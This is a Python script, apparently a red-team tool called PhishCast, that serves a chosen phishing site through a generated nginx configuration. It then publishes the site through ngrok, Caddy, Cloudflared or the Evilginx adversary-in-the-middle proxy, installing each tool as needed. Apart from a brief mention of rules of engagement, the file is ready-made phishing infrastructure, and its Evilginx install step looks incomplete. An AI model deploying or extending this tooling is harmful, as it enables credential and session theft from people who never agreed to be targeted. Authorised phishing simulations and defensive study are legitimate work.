######################################################################################################################################################################################################################
# Python script for phishing sites and link generation Note: Be mindful of the scope of work, & rules of engagement. By 41ph4-01 23/04/2024 & our community. 
# sudo python3 PhishCast.py - ensure all file are located in the same folder. For evilginx interaction after installation, SSL certificates and domain settings in the Evilginx configuration file (config.yml)
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import subprocess
import shlex


# Banner
def display_splash_screen():
    splash = r"""
  
 __________.__    .__        .__    _________                  __          _____  ____         .__       _____           _______  ____ 
\______   \  |__ |__| ______|  |__ \_   ___ \_____    _______/  |_       /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
 |     ___/  |  \|  |/  ___/|  |  \/    \  \/\__  \  /  ___/\   __\     /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
 |    |   |   Y  \  |\___ \ |   Y  \     \____/ __ \_\___ \  |  |      /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
 |____|   |___|  /__/____  >|___|  /\______  (____  /____  > |__|______\____   | |___||   __/ |___|  |____   |           \_____  /___|
               \/        \/      \/        \/     \/     \/     /_____/     |__|      |__|         \/     |__|                 \/  

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |
     
"""
    print(splash)


# Function to generate Nginx config for the selected site
def generate_nginx_config(site_name):
    site_folder = os.path.join("sites", site_name)
    if not os.path.exists(site_folder):
        print(f"Site folder for {site_name} does not exist.")
        return None

    nginx_config_path = f"/etc/nginx/sites-available/{site_name}"
    symlink_path = f"/etc/nginx/sites-enabled/{site_name}"

    # Nginx config template
    nginx_config = f"""
server {{
    listen 80;
    server_name localhost;

    root {site_folder};  # Path to the selected site folder

    index index.php index.html;
    location / {{
        try_files $uri $uri/ =404;
    }}

    location ~ \.php$ {{
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;  # Adjust to your PHP-FPM version
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }}

    location /assets/ {{
        try_files $uri =404;
    }}
}}
"""

    # Write the config to the file
    with open(nginx_config_path, 'w') as config_file:
        config_file.write(nginx_config)
        os.chmod(nginx_config_path, 0o600)  # Secure file permissions

    # Create a symlink to enable the site
    if not os.path.exists(symlink_path):
        os.symlink(nginx_config_path, symlink_path)

    return nginx_config_path

# Function to reload Nginx and serve the selected site
def serve_site_with_nginx(site_name):
    nginx_config_path = generate_nginx_config(site_name)
    if nginx_config_path:
        print(f"Generated Nginx config for {site_name}: {nginx_config_path}")

        # Reload Nginx to apply the new config
        try:
            subprocess.run(["sudo", "nginx", "-s", "reload"], check=True)
            print(f"Successfully started Nginx and serving {site_name}")
        except subprocess.CalledProcessError as e:
            print(f"Error restarting Nginx: {e}")

# Function to check if a command exists
def command_exists(command):
    return subprocess.call(f"type {shlex.quote(command)}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Function to install a command
def install_command(command, install_commands):
    if not command_exists(command):
        print(f"Installing {command}...")
        for cmd in install_commands:
            subprocess.run(cmd, check=True)

# Function to start a reverse proxy
def start_reverse_proxy(command, start_commands):
    print(f"Starting {command}...")
    process = subprocess.Popen(start_commands, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

# Function to handle reverse proxy options (NGROK, Caddy, Cloudflared, Evilginx)
def reverse_proxy_setup():
    proxies = {
        1: ("NGROK", "ngrok", [["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"], ["unzip", "ngrok-stable-linux-amd64.zip"], ["sudo", "mv", "ngrok", "/usr/local/bin/ngrok"]], ["ngrok", "http", "80"]),
        2: ("Caddy", "caddy", [["sudo", "apt-get", "install", "-y", "caddy"]], ["caddy", "run", "--config", "/etc/caddy/Caddyfile"]),
        3: ("Cloudflared", "cloudflared", [["wget", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"], ["sudo", "dpkg", "-i", "cloudflared-linux-amd64.deb"]], ["cloudflared", "tunnel", "--url", "http://localhost:80"]),
        4: ("Evilginx", "evilginx", [["sudo", "apt-get", "install", "-y", "git"], ["sudo", "apt-get", "install", "-y", "golang"], ["sudo", "apt-get", "install", "-y", "make"]], ["sudo", "evilginx", "-p", "/etc/evilginx2/config"])
    }

    print("\nSelect a reverse proxy:")
    for i, (name, _, _, _) in proxies.items():
        print(f"{i}. {name}")

    try:
        choice = int(input("Enter the number of the reverse proxy to use: "))
        if choice in proxies:
            name, command, install_cmds, start_cmds = proxies[choice]
            install_command(command, install_cmds)
            process = start_reverse_proxy(command, start_cmds)
        else:
            print("Invalid choice. Please try again.")
    except ValueError:
        print("Invalid input. Please enter a number.")
        reverse_proxy_setup()

if __name__ == "__main__":
    display_splash_screen()
    site_name = os.getenv('SITE_NAME', 'default_site')
    serve_site_with_nginx(site_name)
    reverse_proxy_setup()
